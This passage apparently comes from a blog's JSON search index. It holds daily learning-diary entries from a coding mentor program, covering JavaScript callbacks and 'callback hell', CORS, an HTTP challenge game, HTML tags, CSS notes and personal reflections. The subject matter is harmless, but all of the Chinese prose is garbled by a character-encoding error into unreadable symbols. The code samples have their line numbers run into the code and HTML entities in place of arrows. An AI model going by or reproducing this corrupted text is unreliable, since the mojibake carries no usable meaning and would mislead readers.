»å¤šçš„ï¼Œæœ‰æ™‚å€™ç•¶ä½ å…ˆè§£æ±ºé‚£äº›å°å•é¡Œï¼Œæˆ–è€…æ˜¯å…ˆæŠŠå•é¡Œçµ¦ç°¡åŒ–ï¼Œæœ€å¾Œä½ å†å»ç†è§£é‚£å€‹å¤§å•é¡Œçš„æ™‚å€™é€šå¸¸å°±èƒ½è¿åˆƒè€Œè§£ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œåœ¨è™•ç†éåŒæ­¥è¡Œç‚ºçš„æ™‚å€™ï¼Œå‡ºç¾å„ç¨® callback æ™‚ç¸½æœƒè®“äººå¼„å¾—é ­æ˜çœ¼èŠ±çš„ï¼Œæ‰€ä»¥æˆ‘æœƒè©¦è‘—å…ˆæŠŠé‚£äº› callback å¯«æˆä¸€å€‹æ˜ç¢ºçš„ functionï¼ˆå‘½åå‡½å¼ï¼‰ï¼Œé€™æ¨£å­åœ¨æŠŠ callback å‚³å…¥æŸå€‹éåŒæ­¥ function çš„æ™‚å€™å°±ä¸æœƒçœ‹å¾—çœ¼èŠ±æ’©äº‚ï¼Œå› ç‚ºä½ èƒ½ä¸€çœ¼å°±çœ‹æ¸…æ¥šæ¶æ§‹ï¼Œæ¯”å¦‚é€™å€‹ä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930313233343536// ç¬¬ä¸€å€‹éåŒæ­¥ functionfunction A(callback) { setTimeout(callback, 1000)}// ç¬¬äºŒå€‹éåŒæ­¥ functionfunction B(callback) { setTimeout(callback, 1000)}// ç¬¬ä¸‰å€‹éåŒæ­¥ functionfunction C(callback) { setTimeout(callback, 1000)}// ç¬¬ä¸€å€‹ callbackfunction callbackA() { console.log('first!') // åœ¨é€™è£¡å‘¼å«ä¸‹ä¸€å€‹ function =&gt; B B(callbackB)}// ç¬¬äºŒå€‹ callbackfunction callbackB() { console.log('second!') // åœ¨é€™è£¡å‘¼å«ä¸‹ä¸€å€‹ function =&gt; C C(callbackC)}// ç¬¬ä¸‰å€‹ callbackfunction callbackC() { // é€™æ˜¯æœ€å¾Œä¸€å€‹ï¼Œæ²’æœ‰å…¶ä»– function äº†ã€‚ console.log('third!')}/* åŸ·è¡Œé †åºï¼š A =&gt; A çš„ callback å‘¼å« B B =&gt; B çš„ callback å‘¼å« C C =&gt; C çš„ callback å°å‡ºçµæœï¼ŒçµæŸ */A(callbackA) ä¸é€™æ¨£å¯«çš„è©±å°±æ˜¯å¤§å®¶ä¿—ç¨±çš„ã€Œæ³¢å‹•æ‹³ï¼ˆcallback hellï¼‰ã€ï¼š 12345678910111213141516171819202122232425// ç¬¬ä¸€å€‹éåŒæ­¥ functionfunction A(callback) { setTimeout(callback, 1000)}// ç¬¬äºŒå€‹éåŒæ­¥ functionfunction B(callback) { setTimeout(callback, 1000)}// ç¬¬ä¸‰å€‹éåŒæ­¥ functionfunction C(callback) { setTimeout(callback, 1000)}// åŸ·è¡Œç¬¬ä¸€å€‹ function =&gt; AA(function() { console.log('first!') // åœ¨é€™è£¡å‘¼å«ä¸‹ä¸€å€‹ function =&gt; B B(function() { console.log('second!') // åœ¨é€™è£¡å‘¼å«ä¸‹ä¸€å€‹ function =&gt; C C(function() { console.log('third!') }) })}) é›–ç„¶ä»¥é€™å€‹ä¾‹å­ä¾†èªªå¯èƒ½æœƒè¦ºå¾—ç¬¬äºŒç¨®å¯«æ³•æ¯”è¼ƒç°¡æ½”ï¼Œä½†é‚£æ˜¯å› ç‚ºé€™è£¡çš„ callback è¦åšçš„äº‹æƒ…å¾ˆå°‘ï¼Œç­‰äº‹æƒ…ä¸€å¤§å †çš„æ™‚å€™ä½ å°±ä¸æœƒé€™æ¨£è¦ºå¾—äº†ã€‚ é¡Œå¤–è©±ä»Šå¤©è·Ÿå¥³æœ‹å‹ä¸€èµ·å»å…¨è¯è²·ææ–™å›ä¾†ç…®ç«é‹ï¼ŒçœŸæ˜¯ä¾¿å®œåˆå¥½åƒ (Â´,,â€¢Ï‰â€¢,,)â™¡ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥é–‹å§‹åš week5 çš„é€²åº¦ï¼Œè·ŸæŠŠä»Šå¤©å­¸åˆ°çš„æ±è¥¿åšå¥½ç­†è¨˜ã€‚","link":"/2022/01/09/mentor-program-day28/"},{"title":"mentor-program-day29","text":"ä¾†ä¸åŠæ‰“æ—¥è¨˜çš„ä¸€å¤©ã€‚ é€²åº¦æœ¬ä¾†æ˜¯æƒ³æŠŠç­†è¨˜æ‰“å®Œå†ä¾†å¯«ç´€éŒ„çš„ï¼Œä½†æœ€å¾Œç­†è¨˜çš„å…§å®¹æ¯”æˆ‘æƒ³åƒä¸­ä¾†çš„é•·ï¼Œæ‰€ä»¥æ‹–åˆ°éš”å¤©æ‰ä¾†è£œï¼Œé™„ä¸Šä¸€ä¸‹ç•¶æ™‚åšåˆ°ä¸€åŠçš„ç­†è¨˜ï¼š å¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶ HTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾— Node ä¸­çš„ buffer æ¨¡çµ„ ä¸»è¦å°±æ˜¯é€™æ¨£ï¼Œå‰©ä¸‹å°±éš”å¤©å†ä¾†è£œå®Œã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨ç©äº† Lidemy HTTP Challenge å¾Œï¼Œå­¸åˆ°äº†è »å¤šæ±è¥¿ï¼Œä¾†ç”¨å€‹å¾ˆå°‘ç”¨çš„ã€Œæ¢åˆ—å¼ã€ä¾†æ•˜è¿°ä¸€ä¸‹ï¼š 1. http basic authentication ä¸€ç¨® HTTP é©—è­‰çš„æ–¹å¼ï¼Œåœ¨æˆ‘ä¸² Twitch API çš„æ™‚å€™ä¹Ÿæœ‰ç”¨åˆ°ï¼Œåªæ˜¯ç”¨çš„æ˜¯ã€Œbearerã€ä¸æ˜¯ã€Œbasicã€ã€‚ 2. buffer å­¸åˆ°äº†æ€éº¼è™•ç†äºŒé€²åˆ¶çš„è³‡æ–™ï¼Œä¹Ÿå­¸åˆ°äº†ä¸€ç¨®æ–°çš„ç·¨ç¢¼æ–¹å¼ã€Œbase64ã€ 3. CROS èˆ‡ç€è¦½å™¨é™åˆ¶ åœ¨åšäº†ç­†è¨˜å¾Œï¼Œæ‰çœŸæ­£ç†è§£åœ¨ã€Œç€è¦½å™¨ã€æœƒå—åˆ°å“ªäº›é™åˆ¶ã€‚é€™æ˜¯å¾ˆæœ‰æ„æ€çš„éƒ¨åˆ†ï¼Œå› ç‚ºç•¶ä¸æ˜¯åœ¨ç€è¦½å™¨çš„æ™‚å€™ï¼Œå¾ˆå¤šé™åˆ¶å°±éƒ½æ²’æœ‰äº†ï¼Œèƒ½åšçš„äº‹æƒ…ä¹Ÿæ›´å¤šäº†ã€‚ é¡Œå¤–è©±è‡ªå¾ä¸²äº† Twitch çš„ API ä¹‹å¾Œï¼Œæ¯å¤©éƒ½è¦ä¸Š Twich çœ‹ä¸€ä¸‹å°ç•¶å®¶ã€‚ ä¸çŸ¥é“é€™åˆ°åº•æ˜¯å“ªå€‹å¤©æ‰æ”¹çš„å­—å¹•ã€‚ æœŸè¨±æ˜å¤©è¦æŠŠç­†è¨˜è£œå®Œï¼Œé‚„æœ‰é–‹å§‹è¶•é€²åº¦ã€‚","link":"/2022/01/11/mentor-program-day29/"},{"title":"mentor-program-day30","text":"æ¯ä¸€å¤©éƒ½è¦æ¯”æ˜¨å¤©çš„è‡ªå·±æ›´å¥½ã€‚ é€²åº¦ä»Šå¤©é †åˆ©æŠŠæ˜¨å¤©æ²’åšå®Œçš„ç­†è¨˜åšå®Œäº†ï¼š å¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶ HTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾— ä¹Ÿçœ‹äº†ä¸€é» [FE101]ï¼Œç›®å‰çœ‹åˆ° 37%ï¼Œä¹Ÿå°±æ˜¯ HTML çš„éƒ¨ä»½ï¼Œæ‰€ä»¥ä¹Ÿåšäº†ä¸€å€‹ç°¡çŸ­çš„ç­†è¨˜ï¼š HTML åŸºç¤ å¦å¤–å°±æ˜¯åšäº†ä¸€é¡Œ LIOJ çš„é¡Œç›®ï¼šä¸åˆç¾¤çš„äººï¼Œæ²’æƒ³åˆ°æœ€å¾Œçš„è§£æ³•æ¯”æˆ‘é æœŸä¸­ä¹¾æ·¨ï¼Œé‚„ä¸éŒ¯ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©åˆ†äº«ä¸€ä¸‹è·Ÿ HTML æœ‰é—œçš„äº‹å¥½äº†ã€‚çœ‹å®Œ [FE101] å¾Œç™¼ç¾æœ‰äº›æ¨™ç±¤å¤ªé‚Šç·£äº†ï¼Œå°è‡´æˆ‘éƒ½å¿˜è¨˜ä»–å€‘çš„ç”¨é€”äº†ï¼š &lt;pre&gt; å¯ä»¥ä¿ç•™ç·¨è¼¯å™¨çš„æ–‡å­—æ ¼å¼ &lt;caption&gt; å› ç‚ºæœ‰è¬›åˆ° &lt;table&gt; æ‰€ä»¥å°±å‰›å¥½æƒ³èµ·äº†é€™å€‹æ¨™ç±¤ &lt;a&gt; é‡é»ä¸æ˜¯é€™å€‹æ¨™ç±¤ï¼Œæ˜¯åŸä¾† target çš„é è¨­å±¬æ€§å€¼æ˜¯ _self &lt;iframe&gt; åŸä¾†é™¤äº† google map å¤–é‚„å¯ä»¥åµŒå…¥æ•´å€‹ç¶²é ï¼Œä¹Ÿé †ä¾¿å­¸åˆ°ä¸€å€‹æ–°çš„ headerï¼šx-frame-options &lt;label&gt; æˆ‘æƒ³æˆ‘é€™æ¬¡çœŸçš„è¨˜å¾—ä»–è¦æ€éº¼æ­é…è‘—ç”¨äº† å…¶ä»–é‚„æœ‰åƒæ˜¯è¡¨å–®å…ƒä»¶ &lt;input&gt;ã€&lt;select&gt; éƒ½ä¸€å®šè¦è¨­å®š name è·Ÿ valueï¼Œé€™æ¨£ server æ‰èƒ½æ”¶åˆ°è³‡æ–™ã€‚é€™å€‹æ˜¯å¤šè™§å¯«äº† form çš„ GET èˆ‡ POST çš„å·®ç•° é€™ç¯‡æ–‡ç« ï¼Œè®“æˆ‘æ›´æ¸…æ¥šå‰å¾Œç«¯æ˜¯æ€éº¼äº¤æ›è³‡æ–™çš„ï¼Œè¦ä¸ç„¶æˆ‘ä»¥å‰çœŸçš„ä¸çŸ¥é“é€™å…©å€‹å±¬æ€§å°å¾Œç«¯çš„æ„ç¾©æ˜¯ä»€éº¼ã€‚ é‚„æœ‰å°±æ˜¯ SEO çš„éƒ¨åˆ†ï¼Œé€™éƒ¨åˆ†ä¹Ÿåœ¨ [FE101] è£¡å­¸åˆ°è »å¤šçš„ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½å¥½å¥½å–„ç”¨é€™äº›çŸ¥è­˜ä¾†åšå‡ºæœ€åŸºæœ¬çš„ SEOã€‚ é¡Œå¤–è©±å°ç•¶å®¶é€™éƒ¨å‹•ç•«ç‚ºä»€éº¼é€™éº¼æœ‰é­…åŠ›å‘¢ï¼Ÿ å¥³æœ‹å‹è·Ÿæˆ‘èªªå°ç•¶å®¶çš„ç›´æ’­æ˜¯å¾ 2021 å¹´çš„ 8 æœˆé–‹å§‹åšé¦¬æ‹‰æ¾ç›´æ’­çš„ï¼Œä½†ç¾åœ¨éƒ½å·²ç¶“ä¸€æœˆä»½äº†ï¼Œæ¯å¤©é‚„æ˜¯æœ‰ä¸€ç¾¤ç˜‹ç‹‚çš„äººç­‰è‘—çœ‹é‚£éƒ¨ç†±æ·šç›ˆçœ¶çš„åŠ‡å ´ç‰ˆï¼ˆæ¥­ç«çš„ç•°äººé¤¨ï¼‰ï¼ŒçœŸæ˜¯å¤ªç¥å¥‡äº†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠ [FE101] çµ¦çœ‹å®Œï¼Œç„¶å¾Œåšå®Œç­†è¨˜é–‹å§‹åˆ‡ç‰ˆã€‚","link":"/2022/01/11/mentor-program-day30/"},{"title":"mentor-program-day31","text":"ä¸€å€‹æœˆéå»äº†ã€‚ é€²åº¦ä»Šå¤©æŠŠ [FE101] çœ‹å®Œäº†ï¼Œåšäº†ä¸€äº›ç­†è¨˜ï¼š åˆ©ç”¨ border-radius ä¾†ç•«åœ“å½¢ CSS Selector çš„æ¬Šé‡ CSS pseudo-element CSS ä¸­çš„å®šä½ï¼ˆpositionï¼‰ CSS ä¸­çš„ display å±¬æ€§ å…¶ä»–é‚„æœ‰ä¸€äº›ç­†è¨˜é‚„æ²’åšå®Œï¼Œæ˜å¤©æœƒå†è£œä¸Šä¾†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©è¤‡ç¿’äº†è »å¤šä»¥å‰å­¸éçš„ CSS çŸ¥è­˜ï¼Œä¸éæœ‰äº›æ±è¥¿æ˜¯æˆ‘ä»¥å‰ä¸çŸ¥é“çš„ï¼Œæˆ‘è¦ºå¾—é‚„è »æœ‰è¶£çš„ï¼š 1. border-radius ç•«åœ“å½¢çš„åŸç† æˆ‘çŸ¥é“é€™å€‹å±¬æ€§å¯ä»¥æ‹¿ä¾†ç•«åœ“å½¢ï¼Œä½†æˆ‘ä¸€ç›´ä¸çŸ¥é“çš„æ˜¯å®ƒçš„åŸç†æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥ä»Šå¤©åœ¨å› ç·£éš›æœƒä¸‹æŸ¥äº†ä¸€äº›è³‡æ–™ï¼Œæœ€å¾Œå¼„æ˜ç™½äº†ã€‚ 2. CSS Specificity å…¶å¯¦å°±æ˜¯ã€Œæ¬Šé‡ã€ï¼Œåªæ˜¯ä»–çš„è‹±æ–‡å¿µèµ·ä¾†ç‰¹åˆ¥é…·æ‰€ä»¥æ‰å¯«è‹±æ–‡ï¼ˆç¡¬è¦çƒ™ï¼‰ã€‚ ä»¥å‰å°±çŸ¥é“ CSS Selector èƒŒå¾Œæœ‰å¥—è¨ˆç®—å…¬å¼ï¼Œä½†ä¹Ÿæ˜¯å¾ˆå¯æƒœéƒ½æ²’å»ç‰¹åˆ¥æŸ¥è³‡æ–™ï¼Œèƒ½åœ¨ä»Šå¤©å¼„æ‡‚çœŸå¥½ï¼ 3. pseudo-element çš„é‹ç”¨ ä»¥å‰æœ€å¸¸æ‹¿å®ƒä¾†ç•«ä¸‰è§’å½¢æˆ–è£é£¾å“ï¼Œä»Šå¤©é¡å¤–å­¸åˆ°åŸä¾†é‚„æœ‰å€‹ attr() çš„ç”¨æ³•ï¼Œæ‰€ä»¥ç«‹é¦¬çµ¦ç­†è¨˜ä¸‹ä¾†ï¼ 4. position sticky ä¹Ÿæ˜¯çŸ¥é“æœ‰é€™å€‹å±¬æ€§ï¼Œä½†å¯¦éš›ä¸å¸¸ç”¨åˆ°ï¼Œå†åŠ ä¸Šè¦è€ƒæ…®æ”¯æ´åº¦çš„å•é¡Œï¼Œæ‰€ä»¥ä¹Ÿæ˜¯é‚Šç·£åˆ°è¢«æˆ‘å¿˜è¨˜ QQï¼Œä»Šå¤©æŠŠå®ƒç­†è¨˜ä¸‹ä¾†ï¼Œç›¸ä¿¡ä¹‹å¾Œè¦ç”¨åˆ°å°±èƒ½é¦¬ä¸Šå›ä¾†æŸ¥äº†ã€‚ å…¶ä»–é‚„æœ‰å¾ˆå¤šå¾ˆå¤šå°±ä¸ä¸€ä¸€åˆ—å‡ºä¾†äº†ã€‚CSS æ˜¯å€‹å¾ˆæ·±çš„å‘é˜¿ï¼Œèƒ½ç”¨çš„å±¬æ€§å¤ªå¤šäº†ã€‚ é¡Œå¤–è©±æœ€è¿‘ç™¼ç”Ÿäº†ä¸€é»äº‹æƒ…ï¼Œé›–ç„¶ä¸çŸ¥é“è‡ªå·±é‚„å¯ä»¥æ’å¤šä¹…ï¼Œä½†æ˜¯ä¸€å®šè¦æŒ¯ä½œèµ·ä¾†ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠæ²’åšå®Œçš„ç­†è¨˜åšå®Œï¼Œç„¶å¾Œæ‡‰è©²å¯ä»¥é–‹å§‹åš week5 çš„ä½œæ¥­äº†ã€‚","link":"/2022/01/12/mentor-program-day31/"},{"title":"mentor-program-day32","text":"è¶…è‹±è¶•ç¾ã€‚ é€²åº¦ä»Šå¤©æŠŠæ˜¨å¤©çš„æ²’åšå®Œçš„ç­†è¨˜è£œå®Œäº†ï¼š CSS ä¸€äº›ä¹…äº†å¯èƒ½æœƒå¿˜è¨˜çš„å±¬æ€§ CSS ç›’æ¨¡å‹ï¼ˆbox-modelï¼‰ CSS å‚ç›´ç½®ä¸­ CSS è®“æ–‡å­—æœ‰ â€¦ çš„æ•ˆæœ CSS nth-child CSS nth-of-type CSS ä¹‹æˆ‘çš„åœ–ç‰‡æœ‰ç¸«ï¼ å¦å¤–ä¹Ÿå¾ˆæ„å¤–åœ°å±…ç„¶åªèŠ± 2 å°æ™‚å·¦å³å°±æŠŠ week6 çš„ç‰ˆåˆ‡å¥½äº†ï¼ï¼ˆå« RWDï¼‰ï¼š é›–ç„¶æ‹¿çµ¦æŸå€‹å« Amos çš„çœ‹ä¸€å®šè¢«ç¬‘èªªã€Œé€™å°±ç¨€é£¯ç‰ˆé˜¿ã€ï¼Œä½†é‚„æ˜¯æŒºæ„å¤–èƒ½çœ‹åˆ°è‡ªå·±æˆé•·äº†è¨±å¤šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¸€æ¨£åšäº†ä¸å°‘è·Ÿ CSS æœ‰é—œçš„ç­†è¨˜ã€‚å…¶å¯¦æŒºé›£å¾—çš„ï¼Œç¬¬ä¸€æ¬¡æœ‰æƒ³è¦è¶•å¿«åˆ‡ç‰ˆçš„å¿ƒæƒ…ï¼Œä¹Ÿè¨±æ˜¯å› ç‚ºå­¸åˆ°äº†å¾ˆå¤šæ±è¥¿ï¼Œæ‰€ä»¥æ‰è¿«ä¸æ€¥å¾…æƒ³è©¦è©¦æ‰‹æ„Ÿçš„é€™ç¨®æ„Ÿè¦ºå§ï¼Ÿ å¦å¤–ä¹Ÿçœ‹ç‰¹åœ°ä¸‹è¼‰äº†ä¸€äº›åŒå­¸åˆ‡ç‰ˆçš„ä½œæ¥­ä¾†çœ‹ï¼Œæ„Ÿè¦ºåƒæ˜¯çœ‹åˆ°äº†ä»¥å‰çš„è‡ªå·±ã€‚ä¸çŸ¥é“å¤§éƒ¨åˆ†çš„äººåœ¨å‰›é–‹å§‹å­¸ CSS çš„æ™‚å€™æ˜¯ä¸æ˜¯éƒ½åƒæˆ‘ä¸€æ¨£æœ‰é€™äº›å¿ƒæƒ…ï¼Œã€ŒClass ä¸€å¤§å †å¥½äº‚å¥½ç…©ã€ã€ã€Œæˆ‘é€™æ¨£å¯«æ˜¯å°çš„å—ï¼Ÿã€ã€ã€Œé€™é‚Šåˆ°åº•è¦è¨­ px é‚„æ˜¯ %ã€ã€ã€Œæ€éº¼ HTML çµæ§‹å°±æ˜¯å°ä¸ä¸Šä¾†ã€ã€ã€ŒRWD è©²æ€éº¼è¨­å®šã€ç­‰ç­‰ä¹‹é¡çš„ OSã€‚ å…¶å¯¦åœ¨çœ‹åˆ°å¤§å®¶éƒ½æœ‰åŒæ¨£çš„æ„Ÿå—æ™‚ï¼Œæˆ‘æ…¢æ…¢åœ°é‡‹æ‡·äº†ã€‚ä¸æ˜¯æˆ‘å¾ˆç¬¨å­¸ä¸å¥½ CSSï¼Œè€Œæ˜¯ CSS å°±è·Ÿå¯« JavaScript ä¸€æ¨£ï¼Œæ²’æœ‰çµ•å°æ­£ç¢ºçš„è§£æ³•ï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦è¦æ±‚è‡ªå·±åšåˆ°æœ€å®Œç¾ï¼Œåªè¦ä»¥è‡ªå·±çš„èƒ½åŠ›ä¾†ç›¡åŠ›é”æˆç›®æ¨™å°±å¥½äº†ã€‚åœ¨ CSS çš„ä¸–ç•Œè£¡ï¼Œç‰ˆé¢åªè¦çœ‹èµ·ä¾†ä¸€æ¨£å°±å¥½ï¼Œåœ¨ JavaScript çš„ä¸–ç•Œè£¡ä¹Ÿä¸€æ¨£ï¼Œåªè¦æˆ‘ input æ±è¥¿é€²å»ï¼Œoutput å‡ºä¾†èƒ½å¤ ä¸€æ¨£ï¼Œå°±ç®—è·Ÿåˆ¥äººçš„ä½œæ³•ä¸ä¸€æ¨£ï¼Œåˆæœ‰ä»€éº¼ä¸å¯ä»¥å‘¢ï¼Ÿ ä¸éé€™ä¹Ÿä¸æ˜¯èªªè¦æ°¸é æŠŠè‡ªå·±ä¾·é™åœ¨æŸå€‹é»ï¼Œç•¶ç„¶é‚„æ˜¯è¦ç›¡å¯èƒ½è®“è‡ªå·±è¶Šä¾†è¶Šå¥½ã€‚åªæ˜¯æˆ‘æƒ³èªªçš„æ˜¯ï¼Œä¸è¦å› ç‚ºè‡ªå·±ç•¶ä¸‹çš„èƒ½åŠ›ä¸è¶³å°±å¦å®šæ‰è‡ªå·±çš„ä¸€åˆ‡ï¼Œå…¶å¯¦ä¸æ˜¯èƒ½åŠ›ä¸è¶³ï¼Œåªæ˜¯éœ€è¦æ™‚é–“ä¾†æ…¢æ…¢æˆé•·ç½·äº†ã€‚æœ€é‡è¦çš„äº‹æƒ…é‚„æ˜¯å…ˆæŠŠçœ¼å‰èƒ½åšçš„çµ¦åšåˆ°åšå¥½ï¼Œé€™æ¨£å­æƒ³ä¹Ÿè¨±å°±ä¸æœƒç¸½æ˜¯å¸¸å¸¸æ„Ÿåˆ°å¿ƒæƒ…ç–²æ†Šäº†ã€‚ é¡Œå¤–è©±æœ€è¿‘ç–«æƒ…å¥½åƒåˆåš´é‡èµ·ä¾†äº†ï¼Œé‚„æ˜¯å¸Œæœ›ä¸è¦è®Šå¾—è¶Šä¾†è¶Šåš´é‡æ‰å¥½ã€‚ æœŸè¨±æ˜å¤©æ²’æ„å¤–æœƒç¹¼çºŒåš week5 + week6 çš„ä½œæ¥­å§ï¼Œé‚„æœ‰æƒ³é–‹å§‹æŠŠä¸€äº›ä»¥å‰åšçš„ç­†è¨˜çµ¦è£œä¸Šä¾†ã€‚ å…¶å¯¦å›éé ­éå»çœ‹ä»¥å‰å¯«çš„æ±è¥¿ï¼Œèƒ½çœ‹åˆ°ä»¥å‰çš„è‡ªå·±çœŸçš„é‚„è »åŠªåŠ›å­¸ç¿’çš„ï¼Œå¯æ˜¯ä¹Ÿè¨±æˆ‘å¤ªè¿½æ±‚å®Œç¾äº†ï¼Œæ‰€ä»¥å¸¸å¸¸å¡åœ¨ä¸€å€‹åœ°æ–¹å¡äº†å¥½å¹¾å¤©ï¼Œå¥½å¹¾å¤©ã€‚ äººä¸å¯èƒ½ä¸€ä¸‹å­å°±å®Œç¾çš„å­¸å¥½æ‰€æœ‰æ±è¥¿ï¼Œå¦‚æœçœŸçš„è¦åšåˆ°é€™ç¨®ç¨‹åº¦ï¼Œå°±ç®—èŠ±ä¸Šä¸€è¼©å­çš„æ™‚é–“ä¹Ÿä¸ä¸€å®šåšçš„å®Œå§ã€‚","link":"/2022/01/13/mentor-program-day32/"},{"title":"mentor-program-day33","text":"æˆ‘èƒ½è®Šæˆè‡ªå·±æƒ³æˆç‚ºçš„æ¨¡æ¨£å—ã€‚ é€²åº¦ä»Šå¤©æƒ³äº†ä¸€äº›äº‹æƒ…å¾Œï¼Œå°æ–¼ä¸€äº›ä»¥å‰æ²’æœ‰å¾ˆç†è§£çš„æ±è¥¿æœ‰äº†æ–°çš„æƒ³æ³•ï¼Œæ‰€ä»¥èŠ±äº†ä¸€é»æ™‚é–“å¯«æ–‡ç« ï¼Œçµæœå°±ä¸çŸ¥ä¸è¦ºä¸€å€‹ä¸‹åˆåˆé€™æ¨£éå»äº†ï¼š æ­£å‰‡è¡¨é”å¼ä¹‹ã€Œæˆ‘åªæƒ³è¦ xxx è£¡é¢çš„å…§å®¹ã€ å…ˆç†è§£ä½œç”¨åŸŸè·Ÿå›å‚³å€¼ï¼Œå†ä¾†è«‡é–‰åŒ…ã€‚ å¦å¤–ä¹Ÿåšäº† week5 çš„ä½œæ¥­ï¼Œä¸€å€‹æ˜¯ å¤§å¹³å°ï¼Œå¦ä¸€å€‹åƒè€ƒå‰å¹¾å±†å­¸é•·å§Šçš„å¿ƒå¾—ä¾†å¯«æ„Ÿæƒ³ï¼Œè¦ºå¾—æ¯å€‹äººéƒ½é‚„è »å²å®³çš„ï¼Œåœ¨é¢å°äº†é€™éº¼å¤šå›°é›£é‚„æ˜¯èƒ½å¤ æ’åˆ°æœ€å¾Œï¼Œæˆç‚ºç¨ç•¶ä¸€é¢çš„å·¥ç¨‹å¸«ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å¯«çš„å…©ç¯‡æ–‡ç« æ‡‰è©²æ˜¯æˆ‘å­¸åˆ°æœ€å¤šçš„æ±è¥¿å§ï¼Œå¥³æœ‹å‹ä»¥å‰å°±è·Ÿæˆ‘èªªéã€Œä»¥å¾Œå¯ä»¥çš„è©±è©¦è‘—ç”¨è‡ªå·±çš„æƒ³æ³•ä¾†å¯«å¯«çœ‹ã€é€™ä»¶äº‹ï¼Œè€Œä»Šå¤©ä¹Ÿç®—æ˜¯å¦‚é¡˜ä»¥å„Ÿåšåˆ°äº†ã€‚é›–ç„¶è‡ªå·±è¦ºå¾—ä¸å®Œç¾ï¼Œä½†æ˜¯èƒ½å¤ è·¨å‡ºç¬¬ä¸€æ­¥ä¹Ÿæ˜¯ä»¶ä¸éŒ¯çš„äº‹æƒ…å§ã€‚ å¦å¤–å°±æ˜¯åœ¨çœ‹äº†å¾ˆå¤šå­¸é•·å§Šçš„å¿ƒå¾—å¾Œï¼Œå¿ƒæƒ…ä¸ç¦æœ‰é»è¤‡é›œï¼Œä¸€æ–¹é¢æ˜¯æ“”å¿ƒå¾Œé¢çš„èª²ç¨‹å£“åŠ›æœƒè¶Šä¾†è¶Šé‡ï¼Œå¦ä¸€æ–¹é¢æ˜¯æ“”å¿ƒè‡ªå·±çš„ç¨‹åº¦æ˜¯ä¸æ˜¯æ¯”åˆ¥äººè½å¾Œè¨±å¤šã€‚ ä¹Ÿè¨±é€™æ˜¯æˆ‘çš„å£ç¿’æ…£ï¼Œç¸½æœƒå¾€ä¸å¤ªå¥½çš„åœ°æ–¹æƒ³ï¼Œä¹Ÿå¾ˆå¤šæ™‚å€™æœƒå®³æ€•è‡ªå·±é‡è¹ˆè¦†è½ï¼Œé‡è¤‡ä»¥å‰çš„éŒ¯èª¤ã€‚åƒæ˜¯ä»¥ç‚ºè‡ªå·±å·²ç¶“å­¸æœƒäº†ï¼Œä»¥ç‚ºè‡ªå·±ä»€éº¼éƒ½æ‡‚äº†ï¼Œä½†æœ€å¾Œç¢°åˆ°ä¸€äº›äº‹æƒ…å¾Œæ‰ç™¼ç¾ã€Œé˜¿ï¼ŒåŸä¾†æˆ‘ä¸éæ˜¯å€‹ä»¥ç®¡çªºå¤©çš„äº•åº•ä¹‹è›™ã€çš„é€™å‰¯ç‹¼ç‹½æ¨¡æ¨£ã€‚ é›–ç„¶ç¾åœ¨å·²ç¶“éäº† 33 å¤©ï¼Œä½†æ˜¯æˆ‘èƒ½ç†ç›´æ°£å£¯çš„è·Ÿ 33 å¤©å‰çš„è‡ªå·±èªªã€Œæˆ‘æ¯”ç¾åœ¨çš„ä½ å¼·ä¸Šäº†å¥½å¹¾å€ã€é€™ç¨®è©±å—ï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œä¹Ÿè¨±åªæ˜¯æœ‰äº›ç„¦æ…®ï¼Œç•¶è‡ªå·±å¾ˆæœ‰è‡ªä¿¡çš„æ™‚å€™ï¼Œæ„Ÿè¦ºè‡ªå·±ä»€éº¼éƒ½èƒ½å¤ åšåˆ°ã€‚ä½†æ˜¯ç•¶è‡ªå·±é™·å…¥ä½æ½®çš„æ™‚å€™ï¼Œå°±æœƒåƒç¾åœ¨é€™å€‹æ¨£å­ï¼Œä¸çŸ¥é“è‡ªå·±åˆ°åº•åœ¨åšäº›ä»€éº¼ã€‚ ä¹Ÿè¨±æˆ‘éœ€è¦ä¸€é»æ™‚é–“éœéœï¼Œä½†æ˜¯æˆ‘å¾ˆæ¸…æ¥šçš„æ˜¯ï¼Œæˆ‘ä¸€å®šè¦åŠªåŠ›æŠŠé€™ä»½è¨ˆåŠƒçµ¦èµ°å®Œã€‚ é¡Œå¤–è©±å¤§å®¶éƒ½åœ¨æ¸›è‚¥ï¼Œæˆ‘ä¹Ÿæƒ³æ¸›è‚¥ï¼Œä¸éæ¸›è‚¥çœŸçš„æ˜¯ä»¶å›°é›£çš„äº‹æƒ…ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week5 çš„å¿ƒå¾—éƒ¨åˆ†åšå®Œï¼Œç„¶å¾Œç¹¼çºŒ week6 çš„ä½œæ¥­ã€‚","link":"/2022/01/14/mentor-program-day33/"},{"title":"mentor-program-day34","text":"å¥½å¿«rrrr é€²åº¦ä»Šå¤©æŠŠä¹‹å‰æ²’è§£å®Œçš„ Lidemy HTTP Challenge çµ¦ç ´é—œäº†ï¼Œä¹Ÿæ›´æ–°äº†æ”»ç•¥çš„å…§å®¹èˆ‡å¿ƒå¾—ï¼š HTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾— å°ï¼Œä»Šå¤©å¥½åƒå°±åªåšäº†é€™ä»¶äº‹ï¼Œæœ‰å¹¾é—œå¡å¤ªä¹…äº†QQ å­¸åˆ°çš„äº‹æƒ…å› ç‚ºä»Šå¤©éƒ½åœ¨ç 